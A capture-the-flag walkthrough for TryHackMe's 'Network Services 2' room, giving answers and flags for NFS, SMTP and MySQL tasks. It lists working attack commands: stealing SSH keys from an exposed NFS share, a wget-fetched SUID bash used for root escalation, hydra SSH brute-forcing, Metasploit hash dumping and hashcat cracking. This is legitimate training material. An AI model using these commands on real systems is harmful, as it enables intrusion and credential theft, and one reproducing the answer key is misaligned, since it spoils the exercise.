# Network Services 2

{% embed url="https://tryhackme.com/room/networkservices2" %}
https://tryhackme.com/room/networkservices2
{% endembed %}

## Task 2 NFS

#### **What does NFS stand for?**

{% hint style="success" %}
`Network File System`
{% endhint %}

#### **What process allows an NFS client to interact with a remote directory as though it was a physical device?**

{% hint style="success" %}
`mounting`
{% endhint %}

#### **What does NFS use to represent files and directories on the server?**

{% hint style="success" %}
`file handle`
{% endhint %}

#### **What protocol does NFS use to communicate between the server and client?**

{% hint style="success" %}
`RPC`
{% endhint %}

#### **What two pieces of user data does the NFS server take as parameters for controlling user permissions?**

{% hint style="success" %}
`user id / group id`
{% endhint %}

#### Can a Windows NFS server share files with a Linux client?

{% hint style="success" %}
`Y`
{% endhint %}

#### Can a Linux NFS server share files with a MacOS client?

{% hint style="success" %}
`Y`
{% endhint %}

#### **What is the latest version of NFS?**

![](<../../.gitbook/assets/Screenshot from 2020-09-16 16-56-31.png>)

{% hint style="success" %}
`4.2`
{% endhint %}

## Task 3 Enumerating NFS

#### **Conduct a thorough port scan scan of your choosing, how many ports are open?**

```
nmap -p- -v 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-29-09.png>)

{% hint style="success" %}
`7`
{% endhint %}

#### **Which port contains the service we're looking to enumerate?**

```
nmap -sV -p2049 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-03-17.png>)

{% hint style="success" %}
`2049`
{% endhint %}

#### **Use showmount to list the NFS shares, what is the name of the visible share?**

```
showmount -e 10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-04-17.png>)

{% hint style="success" %}
`/home`
{% endhint %}

#### Time to mount the share to our local machine!

#### First, use "_mkdir /tmp/mount_" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

#### Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?

```bash
mkdir /tmp/mount
sudo mount.nfs 10.10.195.187:/home /tmp/mount
cd /tmp/mount/
ls
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-06-37.png>)

{% hint style="success" %}
`cappucino`
{% endhint %}

#### Have a look inside this directory, look at the files. Looks like we're inside a user's home directory...&#x20;

#### Interesting! Let's do a bit of research now, have a look through the folders. Which of these folde**rs** could cont**a**in keys that would give us remote access to the server?

```
ls cappucino/.ssh/
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-09-02.png>)

{% hint style="success" %}
`.ssh`
{% endhint %}

#### **Which of these keys is most useful to us?**

{% hint style="success" %}
`id_rsa`
{% endhint %}

#### Copy this file to a different location your local machine, and change the permissions. Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.

#### **Can we log into the machine using ssh?**

```
cd
cp /tmp/mount/cappucino/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa cappucino@10.10.195.187
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-10-48.png>)

{% hint style="success" %}
`Y`
{% endhint %}

## Task 4 Exploiting NFS

#### First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.

```bash
cd /tmp/mount/cappucino/
```

#### Download the bash executable to your Downloads directory. Then use "cp \~/Downloads/bash ." to copy the bash executable to the NFS share. The copied bash shell must be owned by a root user.

```
wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
sudo chown root:root bash
```

#### Now, we're going to add the SUID bit permission to the bash executable we just copied to the share. What letter do we use to set the SUID bit set using chmod?

```bash
sudo chmod +sx bash
```

{% hint style="success" %}
`s`
{% endhint %}

#### Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like?

```bash
ls -l bash
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-29-49.png>)

{% hint style="success" %}
`rwsr-sr-x`
{% endhint %}

#### Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth.

```bash
cd
ssh -i id_rsa cappucino@10.10.195.187
$ ./bash -p
```

#### Great! If all's gone well you should have a shell as root! What's the root flag?

```bash
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 17-31-09.png>)

{% hint style="success" %}
`THM{nfs_got_pwned}`
{% endhint %}

## Task 5 Understanding SMTP

#### **What does SMTP stand for?**

{% hint style="success" %}
`Simple Mail Transfer Protocol`
{% endhint %}

#### **What does SMTP handle the sending of?**

{% hint style="success" %}
`emails`
{% endhint %}

#### **What is the first step in the SMTP process?**

{% hint style="success" %}
`SMTP handshake`
{% endhint %}

#### **What is the default SMTP port?**

{% hint style="success" %}
`25`
{% endhint %}

#### **Where does the SMTP server send the email if the recipient's server is not available?**

{% hint style="success" %}
`SMTP queue`
{% endhint %}

#### **On what server does the Email ultimately end up on?**

{% hint style="success" %}
`POP/IMAP`
{% endhint %}

#### **Can a Linux machine run an SMTP server?**

{% hint style="success" %}
`Y`
{% endhint %}

#### **Can a Windows machine run an SMTP server?**

{% hint style="success" %}
`Y`
{% endhint %}

## Task 6 Enumerating SMTP

#### First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?

```
nmap 10.10.179.49
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-14-38.png>)

{% hint style="success" %}
`25`
{% endhint %}

#### Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?

```
msfconsole -q
```

{% hint style="success" %}
`msfconsole`
{% endhint %}

#### **Let's search for the module "smtp\_version", what's it's full module name?**

```
msf > search smtp_version
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-16-44.png>)

{% hint style="success" %}
`auxiliary/scanner/smtp/smtp_version`
{% endhint %}

#### **Select the module and list the options. How do we do this?**

```
msf > use 0
msf > options
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-19-48.png>)

{% hint style="success" %}
`options`
{% endhint %}

#### Have a look through the options, does everything seem correct? What is the option we need to set?

```
msf > set RHOSTS 10.10.179.49
```

{% hint style="success" %}
`RHOSTS`
{% endhint %}

#### Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

```
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-20-00.png>)

{% hint style="success" %}
`polosmtp.home`
{% endhint %}

#### **What Mail Transfer Agent (MTA) is running the SMTP server?**

{% hint style="success" %}
`Postfix`
{% endhint %}

#### Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "_smtp\_enum_", what's it's full module name?

```
msf > search smtp_enum
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-22-17.png>)

{% hint style="success" %}
`auxiliary/scanner/smtp/smtp_enum`
{% endhint %}

#### We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists**.**

#### **What option do we need to set to the wordlist's path?**

```
msf > use 0
msf > options
msf > set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-27-24.png>)

{% hint style="success" %}
`USER_FILE`
{% endhint %}

#### Once we've set this option, what is the other essential paramater we need to set?

```
msf > set RHOSTS 10.10.179.49
```

{% hint style="success" %}
`RHOSTS`
{% endhint %}

#### Now, run the exploit, this may take a few minutes

```
msf > set THREADS 16
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-31-30.png>)

#### Okay! Now that's finished, what username is returned?

{% hint style="success" %}
`administrator`
{% endhint %}

## Task 7 Exploiting SMTP

#### **What is the password of the user we found during our enumeration stage?**

```
hydra -l administrator \
      -P /usr/share/metasploit-framework/data/wordlists/password.lst \
      ssh://10.10.179.49 -I -V -f -t64  
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-40-16.png>)

{% hint style="success" %}
`alejandro`
{% endhint %}

#### Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

```
ssh administrator@10.10.179.49 cat smtp.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 21-41-33.png>)

{% hint style="success" %}
`THM{who_knew_email_servers_were_c00l?}`
{% endhint %}

## Task 8 Understanding MySQL

#### **What type of software is MySQL?**

{% hint style="success" %}
`Relational Database Management System`
{% endhint %}

#### **What language is MySQL based on?**

{% hint style="success" %}
`SQL`
{% endhint %}

#### **What communication model does MySQL use?**

{% hint style="success" %}
`client-server`
{% endhint %}

#### **What is a common application of MySQL?**

{% hint style="success" %}
`back end database`
{% endhint %}

#### **What major social network uses MySQL as their back-end database?**

{% hint style="success" %}
`facebook`
{% endhint %}

## Task 9 Enumerating MySQL

#### As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

```
nmap 10.10.16.169
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-46-36.png>)

{% hint style="success" %}
`3306`
{% endhint %}

#### Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server.

```
mysql -h 10.10.16.169 -u root -p
sql > exit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-47-29.png>)

#### Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.

```bash
msfconsole -q
```

#### We're going to be using the "mysql\_sql" module. Search for, select and list the options it needs. What three options do we need to set?

```
msf > search mysql_sql
msf > use 0
msf > options
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-50-36.png>)

{% hint style="success" %}
`PASSWORD/RHOSTS/USERNAME`
{% endhint %}

#### Run the exploit. By default it will test with the "select version()" command, what result does this give you?

```
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-53-53.png>)

{% hint style="success" %}
`5.7.29-0ubuntu0.18.04.1`
{% endhint %}

#### **How many databases are returned?**

```
msf > set SQL show databases
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-55-35.png>)

{% hint style="success" %}
`4`
{% endhint %}

## Task 10 Exploiting MySQL

#### **Search for and select the "mysql\_schemadump" module. What's the module's full name?**

```
msf > search mysql_schemadump
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 18-59-32.png>)

{% hint style="success" %}
`auxiliary/scanner/mysql/mysql_schemadump`
{% endhint %}

#### Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

```
msf > use 0
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 19-01-21.png>)

{% hint style="success" %}
`x$waits_global_by_latency`
{% endhint %}

#### Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql\_hashdump" module. What's the module's full name?

```
msf > search mysql_hashdump
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-46-38.png>)

{% hint style="success" %}
`auxiliary/scanner/mysql/mysql_hashdump`
{% endhint %}

#### Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

```
msf > use 1
msf > set PASSWORD password
msf > set RHOSTS 10.10.16.169
msf > set USERNAME root
msf > exploit
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 19-03-54.png>)

{% hint style="success" %}
`carl`
{% endhint %}

#### Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:\*HASH to a text file on your local machine called "hash.txt".

#### **What is the user/hash combination string?**

{% hint style="success" %}
`carl:*EA031893AA21444B170FC2162A56978B8CEECE18`
{% endhint %}

#### Now, we need to crack the password! Let's try John the Ripper against it using: "_john hash.txt_" what is the password of the user we found?

```bash
echo -n 'EA031893AA21444B170FC2162A56978B8CEECE18' > mysql.txt
hashcat -a 0 -m 300 mysql.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-30-12.png>)

{% hint style="success" %}
`doggie`
{% endhint %}

#### Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?

#### **What's the contents of MySQL.txt**

```
ssh carl@10.10.20.11 cat MySQL.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-16 20-37-20.png>)

{% hint style="success" %}
`THM{congratulations_you_got_the_mySQL_flag}`
{% endhint %}

## :link: Support Material

{% embed url="https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash" %}
